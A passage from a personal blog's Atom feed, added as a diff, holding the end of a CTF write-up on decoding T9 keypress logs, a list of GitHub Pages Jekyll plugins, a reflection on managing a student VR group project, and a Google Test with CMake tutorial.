+<span class="go">LEFTLEFTLEFTLEFTT9_CAPSrudolf where are you bsLEFTLEFT0m, .l ,p
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>sms1.txt
+<span class="go">date: 1999-11-23 03:01:10
+to: 00611015550117
+text: rudolf where are you brrr
+</span></code></pre></div></div>
+
+<p>If you recall, we were also given the timestamps of each keystroke. Remember
+that if you pressed a key and waited long enough, the key would be printed and
+you could press another key (even if it is the same key). So we add this delay
+into play:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ...
+</span><span class="n">TS_DELTA</span> <span class="o">=</span> <span class="mi">900</span>
+<span class="c1"># ...
+</span><span class="k">elif</span> <span class="n">last_key</span> <span class="o">==</span> <span class="n">key</span> <span class="ow">and</span> <span class="n">ts</span> <span class="o">-</span> <span class="n">last_ts</span> <span class="o">&lt;=</span> <span class="n">TS_DELTA</span><span class="p">:</span>
+	<span class="c1"># ...
+</span><span class="k">elif</span> <span class="n">last_key</span> <span class="o">==</span> <span class="n">key</span> <span class="ow">and</span> <span class="n">ts</span> <span class="o">-</span> <span class="n">last_ts</span> <span class="o">&gt;=</span> <span class="n">TS_DELTA</span><span class="p">:</span>
+	<span class="c1"># The same key but more time has passed
+</span>	<span class="k">print</span><span class="p">(</span><span class="n">process</span><span class="p">(</span><span class="n">last_key</span><span class="p">,</span> <span class="n">repeat</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+	<span class="n">repeat</span> <span class="o">=</span> <span class="mi">1</span>
+	<span class="n">last_ts</span> <span class="o">=</span> <span class="n">ts</span>
+<span class="c1"># ...
+</span></code></pre></div></div>
+
+<p>We set a constant <code class="language-plaintext highlighter-rouge">TS_DELTA</code> as a threshold, equal to 900 ms. We run the
+program again and see the results:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python analyze.py sms1.csv
+<span class="go">LEFTLEFTLEFTLEFTT9_CAPSrudolf where are you brrrLEFTLEFT0m, .l ,p
+</span></code></pre></div></div>
+
+<p>Let’s see if we can do the same with <code class="language-plaintext highlighter-rouge">sms4.csv</code>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="c"># Line-breaks for your sanity</span>
+<span class="gp">$</span><span class="w"> </span>python analyze.py sms4.csv
+<span class="go">LEFTLEFTLEFTLEFTT9_CAPSalright pal hersUPeDOWN ye flag good lucj enterUPUPUPUPUPUPUPDOWNRIGHTk
+DOWNDOWNDOWNDOWNDOWNDOWNing it with those hooves lol its
+aotw{l3ts_dr1nk_s0m3_eggnogRIGHTRIGHT0g_y0u_cr4zy_d33r}LEFTLEFT0m.. .l ,p
+</span></code></pre></div></div>
+
+<p>We seem to be very close to the answer. We see that the flag is split up by two
+<code class="language-plaintext highlighter-rouge">RIGHT</code>s. The characters at the left and the right of the delimiter are similar
+to each other. From this, we deduce that the <code class="language-plaintext highlighter-rouge">MENU_RIGHT</code> button acts as a
+backspace. We make these alterations to the code:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ...
+</span><span class="n">KS</span> <span class="o">=</span> <span class="p">{</span>
+	<span class="c1"># ...
+</span>	<span class="mi">101</span><span class="p">:</span> <span class="p">[</span><span class="s">'</span><span class="se">\b</span><span class="s">'</span> <span class="o">*</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">)],</span>
+	<span class="c1"># ...
+</span><span class="p">}</span>
+<span class="c1"># ...
+</span></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">\b</code> is an escape sequence that brings the pointer backwards by 1 character.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="c"># Line breaks for your sanity</span>
+<span class="gp">$</span><span class="w"> </span>python analyze.py sms4.csv
+<span class="go">LEFTLEFTLEFTLEFTT9_CAPSalright pal hersUPeDOWN ye flag good lucj
+enterUPUPUPUPUPUPUPDOWkDOWNDOWNDOWNDOWNDOWNDOWNing it with those hooves lol its
+aotw{l3ts_dr1nk_s0m3_eggn0g_y0u_cr4zy_d33r}LEFTLEFT0m.. .l ,p
+</span></code></pre></div></div>
+
+<p>Also you can see that the <code class="language-plaintext highlighter-rouge">MENU_UP</code> and <code class="language-plaintext highlighter-rouge">MENU_DOWN</code> both correspond to moving
+the pointer to the left and to the right, but since it doesn’t concern the
+flag, we don’t need to worry about them. It is left as an exercise to the
+reader to modify the above code so that it takes <code class="language-plaintext highlighter-rouge">MENU_UP</code> and <code class="language-plaintext highlighter-rouge">MENU_DOWN</code> into
+account.</p>]]></content><author><name></name></author><category term="writeup" /><category term="ctf" /><category term="writeup" /><category term="python" /><summary type="html"><![CDATA[This one was one of the easier ones. We are given some .txt files, .csv files, and a single .h C header file. We see that the .csv files contain keylogging data, where the first column is a timestamp and the second column is the key that was pressed. From these .csv files, we are supposed to figure out what Santa typed.]]></summary></entry><entry><title type="html">Github Jekyll Plugins</title><link href="/jekyll/2018/12/16/gh-jekyll-plugs.html" rel="alternate" type="text/html" title="Github Jekyll Plugins" /><published>2018-12-16T21:00:00-08:00</published><updated>2018-12-16T21:00:00-08:00</updated><id>/jekyll/2018/12/16/gh-jekyll-plugs</id><content type="html" xml:base="/jekyll/2018/12/16/gh-jekyll-plugs.html"><![CDATA[<p>Here is a list of jekyll plugins that can be used on Github using the static
+site generator Jekyll:</p>
+
+<ul>
+  <li><a href="https://github.com/github/pages-health-check"><code class="language-plaintext highlighter-rouge">github-pages-health-check</code></a>: Checks site for common DNS issues</li>
+  <li><a href="https://github.com/benbalter/jekyll-avatar"><code class="language-plaintext highlighter-rouge">jekyll-avatar</code></a>: Helps render github avatars</li>
+  <li><a href="https://github.com/jekyll/jekyll-coffeescript"><code class="language-plaintext highlighter-rouge">jekyll-coffeescript</code></a>: Write Coffescript instead of Javascript!</li>
+  <li><a href="https://github.com/github/jekyll-commonmark-ghpages"><code class="language-plaintext highlighter-rouge">jekyll-commonmark-ghpages</code></a>: Use commonmark!</li>
+  <li><a href="https://github.com/benbalter/jekyll-default-layout"><code class="language-plaintext highlighter-rouge">jekyll-default-layout</code></a>: Set the default layout for posts and pages</li>
+  <li><a href="https://github.com/jekyll/jekyll-feed"><code class="language-plaintext highlighter-rouge">jekyll-feed</code></a>: Generate an atom feed</li>
+  <li><a href="https://github.com/jekyll/jekyll-gist"><code class="language-plaintext highlighter-rouge">jekyll-gist</code></a>: Liquid template for including gists</li>
+  <li><a href="https://github.com/LearnTeachCode/github-jekyll-metadata"><code class="language-plaintext highlighter-rouge">jekyll-github-metadata</code></a>: Access repository metadata</li>
+  <li><a href="https://github.com/jekyll/jekyll-mentions"><code class="language-plaintext highlighter-rouge">jekyll-mentions</code></a>: Github @mention support</li>
+  <li><a href="https://github.com/benbalter/jekyll-optional-front-matter"><code class="language-plaintext highlighter-rouge">jekyll-optional-front-matter</code></a>: Front matter is now optional</li>
+  <li><a href="https://github.com/jekyll/jekyll-paginate"><code class="language-plaintext highlighter-rouge">jekyll-paginate</code></a>: Default (deprecated) pagination engine for jekyll</li>
+  <li><a href="https://github.com/benbalter/jekyll-readme-index"><code class="language-plaintext highlighter-rouge">jekyll-readme-index</code></a>: Render readme as site index</li>
+  <li><a href="https://github.com/jekyll/jekyll-redirect-from"><code class="language-plaintext highlighter-rouge">jekyll-redirect-from</code></a>: Redirect to a page from multiple URLs</li>
+  <li><a href="https://github.com/benbalter/jekyll-relative-links"><code class="language-plaintext highlighter-rouge">jekyll-relative-links</code></a>: Convert md links to html links; useful for
+when you want to have both your repository link to markdown files, and your
+site link to html</li>
+  <li><a href="https://github.com/benbalter/jekyll-remote-theme"><code class="language-plaintext highlighter-rouge">jekyll-remote-theme</code></a>: Use some other theme other than the default ones</li>
+  <li><a href="https://github.com/jekyll/jekyll-sass-converter"><code class="language-plaintext highlighter-rouge">jekyll-sass-converter</code></a>: Sass instead of CSS!</li>
+  <li><a href="https://github.com/jekyll/jekyll-seo-tag"><code class="language-plaintext highlighter-rouge">jekyll-seo-tag</code></a>: Add SEO tags (Facebook, Twitter, etc.) to your pages</li>
+  <li><a href="https://github.com/jekyll/jekyll-sitemap"><code class="language-plaintext highlighter-rouge">jekyll-sitemap</code></a>: Add sitemaps.org compliant sitemap</li>
+  <li><a href="https://github.com/benbalter/jekyll-titles-from-headings"><code class="language-plaintext highlighter-rouge">jekyll-titles-from-headings</code></a>: If a site doesn’t have title front
+matter, auto-adds it from the first heading</li>
+  <li><a href="https://github.com/jekyll/jemoji"><code class="language-plaintext highlighter-rouge">jemoji</code></a>: Emoji for jekyll</li>
+  <li><a href="https://github.com/gettalong/kramdown"><code class="language-plaintext highlighter-rouge">kramdown</code></a>: Write in Kramdown</li>
+  <li><a href="https://github.com/Shopify/liquid"><code class="language-plaintext highlighter-rouge">liquid</code></a>: Use the liquid engine for templating (default)</li>
+  <li><a href="https://github.com/jneen/rouge"><code class="language-plaintext highlighter-rouge">rouge</code></a>: Use rouge for syntax highlighting</li>
+</ul>
+
+<p>Source: <a href="https://github.com/github/pages-gem/blob/master/lib/github-pages/dependencies.rb">github pages-gem</a></p>]]></content><author><name></name></author><category term="jekyll" /><category term="github" /><category term="jekyll" /><category term="plugins" /><category term="ruby" /><summary type="html"><![CDATA[Here is a list of jekyll plugins that can be used on Github using the static site generator Jekyll:]]></summary></entry><entry><title type="html">On Managing a Group Project</title><link href="/project/2018/04/27/managing-a-group-project.html" rel="alternate" type="text/html" title="On Managing a Group Project" /><published>2018-04-27T13:58:00-07:00</published><updated>2018-04-27T13:58:00-07:00</updated><id>/project/2018/04/27/managing-a-group-project</id><content type="html" xml:base="/project/2018/04/27/managing-a-group-project.html"><![CDATA[<p>The semester ended, and I just finished a reasonably large group project on
+Virtual Reality (link <a href="https://github.com/cheukyin699/operation-omega">here</a>; teaser <a href="https://youtu.be/LoFFHOdB3xo">here</a>). Let’s talk about
+what I learned.</p>
+
+<h2 id="stay-silent">Stay Silent</h2>
+
+<p>Group projects require good communication with members to succeed. One of our
+difficulties was getting everyone on a common platform to make communication
+less of an issue. One member did not own a Facebook account, our defacto method
+of communication, so we couldn’t just create a new chat group. He did, however,
+prefer texting, which would in theory make communicating much more
+instantaneous, but also make it complicated for us when we use a computer (very
+few messaging apps also have a computer-friendly interface). Thus, I opened a
+Slack group. This would’ve been great, except that everyone was new to Slack.</p>
+
+<p>One thing about effective communication is that the medium must always be
+convenient. The members should all be very familiar with the intricacies of
+whatever medium you use to communicate, or at least, have been using it for a
+while such that it becomes a natural habit to check (see email). Since none of
+us have used Slack before, we wouldn’t check it often, which kills the platform.
+I tried to get around this by asking everyone to pin a Slack tab on their
+browser, but to no avail. The group still suffered from painfully slow reply
+times, often spanning hours to days. Later in the project, I decided to scrap
+Slack and just message each member individually. This worked slightly better,
+with less-than-an-hour reply time. The downside is that it promotes information
+asymmetry.</p>
+
+<p>Sometimes, even though the medium used to communicate is new to the members,
+everything still works out. Our group used Trello to organize the project, which
+was new to us. We would assign parts of the project to others; everything would
+be submitted via Trello. Trello is an online pin board, so members don’t have to
+check it too often. It also, by default, emails you about cards you are
+assigned, so there is often no escape.</p>
+
+<p>Projects need a constant stream of communication. A haphazard update post just
+wouldn’t do. Every member needs to be aware of the direction the project is
+going in, what everyone is actively working on, and how everyone is contributing
+to the final product. If you have to ask the question: “Did I
+message/update/notify them enough?”, then you may have to reconsider your
+communication system.</p>
+
+<h2 id="do-everything-yourself">Do Everything Yourself</h2>
+
+<p>Group projects should be done as a group. Or at the very least, the entire group
+should be fairly involved in it’s processes (see above on communication). Nobody
+likes to be the one who has to do a disproportionately large/small amount of
+work, especially if they don’t know what they are contributing towards. One of
+our issues include resource management and planning.</p>
+
+<p>Our group had almost zero project experience, and only around a year of
+programming experience. They were very quick to learn the new things taught in
+this class, but only because they had to in order to survive. Out of the group,
+I was the one who had the most of both, if only in theory. I helped come up with
+the idea of the game, which meant that I created content for the game itself.
+The only thing I could delegate as a task was the model and animation creation,
+which I happily assigned to my group.</p>
+
+<p>I cannot fault my group - they were going through school too. I couldn’t expect
+them to put many hours into a project that they (I think) cared less about (they
+were neutral about it - not too passionate) than me (who’s enthusiasm fluctuated
+violently).</p>
+
+<p>This left me with writing all the content (dialog, storyline, plot), programming
+the game, implementing mechanics (1 of which was scrapped), and fiddling with
+other bits and pieces that nobody else did.</p>
+
+<p>I would blame only myself on this, since I based the entire idea of the project
+on my own skill sets - what I was capable of doing. I had a general idea of how
+the project was going to be finished while I had the project idea in my head. I
+heard that good project managers must have a vision for the project, and this is
+no exception. I had to figure out how the entire project would go down before
+almost any work went into it, <strong>and</strong> have confidence knowing that everyone
+would be able to finish it in the allocated time. Let me tell you: It’s hard
+to see into the future.</p>
+
+<h2 id="work-only-when-you-have-to">Work Only When You Have To</h2>
+
+<p>Don’t procrastinate. Have a good, solid, fixed timeline so that your team can
+follow it and be on schedule… is what I would do if I were smarter, more
+motivated and less distracted. Unfortunately for me and my group, I wasn’t. For
+the first month, I basically put the entire project on the back-burner and did
+other things. This isn’t really a project-specific idea, but a life tip in
+general: don’t procrastinate; don’t wait till the last moment. The way our
+teacher got to know our progress was through stages - we submitted reports,
+files and models every few weeks for our professor to gauge our progress; those
+counted for marks, and were basically assignments. The week before they were
+due, we would just work our asses off at school (or perhaps, I would). There
+were a couple of instances (last 2 months) where I practically lived in the
+school computer lab (more than I already did - I normally would never leave that
+place unless I needed to go to classes). I took classes at 8 AM, and left when
+security kicks us all out, at 9 PM, a full 13 hours of work time, or 15 hours
+away from home.</p>
+
+<p><img src="/res/images/time-week.png" alt="line graph on week number vs hours worked" /></p>
+
+<p>The above graph shows the number of hours I worked every week. This project was
+big enough that I decided to start doing time tracking, just for fun (the
+spreadsheet took me 2 hours to tweak). You can see the days where I do next to
+nothing. Also notice the spike due to a “check-up” assignment. In total, I
+worked 85 hours, or 2 weeks, full time.</p>
+
+<p><img src="/res/images/total-spent.png" alt="pie chart on different categories I've worked" /></p>
+
+<p>I used most of my time on the programming portion, where I tried to implement 2
+game mechanics - the dialog system (reads a specially formatted json file that I
+designed) and object interaction system (scrapped; originally highlighted the
+object you were looking at with a yellow glow, but with the side effect of
+removing the original texture on the object, rendering it useless). The rest of
+the time was spent on testing and bug fixing my code.</p>
+
+<p>I needed to delegate more of game programming to my group. But here’s the thing:
+Unity is such a git-hostile environment that, even if my group was experienced
+in git, we would still be having trouble with it. I need to learn to assign
+tasks to the group better, and learn to trust them more.</p>]]></content><author><name></name></author><category term="project" /><category term="programming" /><category term="group" /><category term="unity" /><category term="project" /><summary type="html"><![CDATA[Stuff I learnt from my experience with a group project.]]></summary></entry><entry><title type="html">Google Test Basic Tutorial</title><link href="/tutorial/2017/12/19/googletest-tutorial.html" rel="alternate" type="text/html" title="Google Test Basic Tutorial" /><published>2017-12-19T15:50:00-08:00</published><updated>2017-12-19T15:50:00-08:00</updated><id>/tutorial/2017/12/19/googletest-tutorial</id><content type="html" xml:base="/tutorial/2017/12/19/googletest-tutorial.html"><![CDATA[<h2 id="goal">Goal</h2>
+
+<p>The goal of this tutorial is to get you up and running with Google Test through
+the examples given. This will be more of a walkthrough integrating Google Test
+into your project.</p>
+
+<h2 id="pre-requisites">Pre-requisites</h2>
+
+<ul>
+  <li>Some basic proficiency in C++</li>
+  <li>Some basic understanding of CMake</li>
+  <li>Some understanding of <a href="https://git-scm.com/">git</a> and <a href="https://github.com/">github</a></li>
+</ul>
+
+<h2 id="google-test">Google Test</h2>
+
+<p><a href="https://github.com/google/googletest"><strong>Have this tab open for documentation</strong></a>. You’ll need it.</p>
+
+<h2 id="getting-started">Getting Started</h2>
+
+<p>We will want the following directory structure:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.
+├── CMakeLists.txt
+├── include
+│   └── inc.h
+├── libs
+│   ├── CMakeLists.txt
+│   └── googletest
+├── src
+│   ├── CMakeLists.txt
+│   └── lib.cc
+└── tests
+    ├── CMakeLists.txt
+    ├── Main.cc
+    └── TestAbs.cc
+</code></pre></div></div>
+
+<h3 id="populating-the-files">Populating the files</h3>
+
+<p>Create your directories <code class="language-plaintext highlighter-rouge">include</code>, <code class="language-plaintext highlighter-rouge">libs</code>, <code class="language-plaintext highlighter-rouge">src</code>, and <code class="language-plaintext highlighter-rouge">tests</code>. Then populate
+them with the following:</p>
+
+<p><code class="language-plaintext highlighter-rouge">CMakeLists.txt</code></p>
+
+<div class="language-cmake highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cmake_minimum_required</span><span class="p">(</span>VERSION 3.1<span class="p">)</span>
+<span class="nb">project</span><span class="p">(</span>simple-lib<span class="p">)</span>
+
+<span class="nb">enable_testing</span><span class="p">()</span>
+
+<span class="nb">add_subdirectory</span><span class="p">(</span>src<span class="p">)</span>
+</code></pre></div></div>
+
+<p>The library that we will be making with be very simple, consisting only of a
+single absolute value generic function. Because of good practice, we will
+enclose said function inside of an aptly named namespace.</p>
+
+<p><code class="language-plaintext highlighter-rouge">include/inc.h</code></p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#ifndef INC_H
+#define INC_H
+</span>
+<span class="k">namespace</span> <span class="n">lib</span> <span class="p">{</span>
+    <span class="k">template</span><span class="o">&lt;</span><span class="k">typename</span> <span class="nc">T</span><span class="p">&gt;</span>
+    <span class="n">T</span> <span class="n">abs</span><span class="p">(</span><span class="n">T</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cp">#endif
+</span></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">src/lib.cc</code></p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include "inc.h"
+</span>
+<span class="k">namespace</span> <span class="n">lib</span> <span class="p">{</span>
+    <span class="k">template</span><span class="o">&lt;</span><span class="k">typename</span> <span class="nc">T</span><span class="p">&gt;</span>
+    <span class="n">T</span> <span class="n">abs</span> <span class="p">(</span><span class="n">T</span> <span class="n">v</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">v</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">?</span> <span class="o">-</span><span class="n">v</span><span class="o">:</span> <span class="n">v</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">src/CMakeLists.txt</code></p>
+
+<div class="language-cmake highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set</span><span class="p">(</span>src
+    lib.cc<span class="p">)</span>
+
+<span class="nb">include_directories</span><span class="p">(</span><span class="si">${</span><span class="nv">simple-lib_SOURCE_DIR</span><span class="si">}</span>/include<span class="p">)</span>
+
+<span class="nb">add_library</span><span class="p">(</span>slib <span class="si">${</span><span class="nv">src</span><span class="si">}</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now, let’s add Google Test as a git submodule. Change directory to <code class="language-plaintext highlighter-rouge">libs</code>, and
+execute the following:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git submodule add git@github.com:google/googletest.git googletest
+git submodule update <span class="nt">--init</span> <span class="nt">--recursive</span>
+</code></pre></div></div>
+
+<p>After adding it as a submodule, we will need to link it to our existing project.
+Add to your root CMakeLists.txt file:</p>
+
+<div class="language-cmake highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">add_subdirectory</span><span class="p">(</span>libs<span class="p">)</span>
+</code></pre></div></div>
+
+<p>Insert the following into <code class="language-plaintext highlighter-rouge">libs/CMakeLists.txt</code>:</p>
+
+<div class="language-cmake highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">add_subdirectory</span><span class="p">(</span>googletest<span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="writing-tests">Writing Tests</h2>
+
+<p>Let’s start with the <code class="language-plaintext highlighter-rouge">tests/CMakeLists.txt</code>:</p>
+
+<div class="language-cmake highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set</span><span class="p">(</span>src
+    Main.cc
+    TestAbs.cc<span class="p">)</span>
+
+<span class="nb">add_executable</span><span class="p">(</span>slib_test <span class="si">${</span><span class="nv">src</span><span class="si">}</span><span class="p">)</span>
+
+<span class="nb">include_directories</span><span class="p">(</span><span class="s2">"</span><span class="si">${</span><span class="nv">simple-lib_SOURCE_DIR</span><span class="si">}</span><span class="s2">/include"</span><span class="p">)</span>
+
+<span class="c1"># Link with google test libraries as well as simple-lib</span>
+<span class="nb">target_link_libraries</span><span class="p">(</span>slib_test gtest<span class="p">)</span>
+<span class="nb">target_link_libraries</span><span class="p">(</span>slib_test gtest_main<span class="p">)</span>
+<span class="nb">target_link_libraries</span><span class="p">(</span>slib_test slib<span class="p">)</span>
+
+<span class="c1"># Your milage may vary with the COMMAND</span>
+<span class="nb">add_test</span><span class="p">(</span>
+    NAME atest
+    COMMAND build/tests/slib_test
+    WORKING_DIRECTORY <span class="si">${</span><span class="nv">simple-lib_SOURCE_DIR</span><span class="si">}</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>For all this to work, we will need to use <code class="language-plaintext highlighter-rouge">add_subdirectory</code> in the
+main <code class="language-plaintext highlighter-rouge">CMakeLists.txt</code> file, so make sure you do that.</p>
+
+<div class="language-cmake highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">add_subdirectory</span><span class="p">(</span>tests<span class="p">)</span>
+</code></pre></div></div>
+
+<p>For your <code class="language-plaintext highlighter-rouge">tests/Main.cc</code>, it will basically be the same, since we are using
+Google Test. According to the documentation, you should have the following in
+that file:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include "gtest/gtest.h"
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="o">::</span><span class="n">testing</span><span class="o">::</span><span class="n">InitGoogleTest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">RUN_ALL_TESTS</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To test the single function that this library provides, we create and populate
+<code class="language-plaintext highlighter-rouge">tests/TestAbs.cc</code> with the following:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include "gtest/gtest.h"
+#include "inc.h"
+</span>
+<span class="k">using</span> <span class="n">lib</span><span class="o">::</span><span class="n">abs</span><span class="p">;</span>
+
+<span class="n">TEST</span><span class="p">(</span><span class="n">AbsFunction</span><span class="p">,</span> <span class="n">Functionality</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">ASSERT_EQ</span><span class="p">(</span><span class="n">abs</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span> <span class="mi">50</span><span class="p">);</span>
+    <span class="n">ASSERT_EQ</span><span class="p">(</span><span class="n">abs</span><span class="p">(</span><span class="o">-</span><span class="mi">50</span><span class="p">),</span> <span class="mi">50</span><span class="p">);</span>
+    <span class="n">ASSERT_EQ</span><span class="p">(</span><span class="n">abs</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Other tests are set as an exercise to the reader.</p>
+
+<h2 id="linking-and-compiling-and-running">Linking and Compiling and Running</h2>
+
+<p>CMake projects are easy to link, compile, and run, given you have done your
+<code class="language-plaintext highlighter-rouge">CMakeLists.txt</code> files correctly.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>build
+<span class="nb">cd </span>build/
+
+cmake ..
+make
+make <span class="nb">test</span>
+</code></pre></div></div>
+
+<p>And there you go! Since we are running the tests through CMake, it only shows up
+as one test. If one would wish to see more detailed results of tests, you would
+have to run the test executable directly.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>build/tests/slib_test
+</code></pre></div></div>
+
+<p>Which would (hopefully) give the output:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[==========] Running 2 tests from 1 test case.
+[----------] Global test environment set-up.
+[----------] 2 tests from AbsFunction
+[ RUN      ] AbsFunction.Functionality
+[       OK ] AbsFunction.Functionality (0 ms)
+[ RUN      ] AbsFunction.DifferentTypes
+[       OK ] AbsFunction.DifferentTypes (0 ms)
+[----------] 2 tests from AbsFunction (0 ms total)
+
+[----------] Global test environment tear-down
+[==========] 2 tests from 1 test case ran. (0 ms total)
+[  PASSED  ] 2 tests.
+</code></pre></div></div>
+
+<p>Extra test added, of course.</p>
+
+<p>In my opinion, it gives much prettier output. Though, if you have other methods
+of testing, <code class="language-plaintext highlighter-rouge">make test</code> would work nicely as well.</p>
+
+<h2 id="ending">Ending</h2>
+
+<p><a href="https://github.com/cheukyin699/simple-library">Here</a> is a link to the tested project. Have a look!</p>]]></content><author><name></name></author><category term="tutorial" /><category term="tutorial" /><category term="c++" /><category term="testing" /><summary type="html"><![CDATA[A google test tutorial/example.]]></summary></entry></feed>
